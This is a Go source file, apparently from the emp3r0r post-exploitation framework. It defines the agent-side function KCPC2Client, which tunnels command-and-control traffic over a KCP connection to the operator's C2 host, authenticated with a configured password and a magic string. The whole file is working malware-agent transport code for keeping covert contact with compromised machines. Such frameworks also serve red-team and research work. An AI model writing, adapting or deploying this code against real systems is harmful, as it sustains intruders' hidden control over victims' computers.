package c2transport

import (
	"context"
	"fmt"
	"log"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

var (
	KCPC2Ctx    context.Context
	KCPC2Cancel context.CancelFunc
)

// Connect to C2 KCP server, then to C2 server
func KCPC2Client() {
	if !common.RuntimeConfig.UseKCP {
		return
	}
	log.Printf("C2 traffic will go through KCP tunnel at port %s, KCP server port %s, C2 port %s",
		common.RuntimeConfig.KCPClientPort, common.RuntimeConfig.KCPServerPort, common.RuntimeConfig.CCPort)
	// this context ends when agent exits
	KCPC2Ctx, KCPC2Cancel = context.WithCancel(context.Background())
	defer func() {
		log.Print("KCPC2Client exited")
		KCPC2Cancel()
	}()
	kcp_server_addr := fmt.Sprintf("%s:%s", common.RuntimeConfig.CCHost, common.RuntimeConfig.KCPServerPort)
	err := transport.KCPTunClient(kcp_server_addr, common.RuntimeConfig.KCPClientPort,
		common.RuntimeConfig.Password, def.MagicString, KCPC2Ctx, KCPC2Cancel)
	if err != nil {
		log.Printf("KCPC2Client failed to start: %v", err)
	}
}
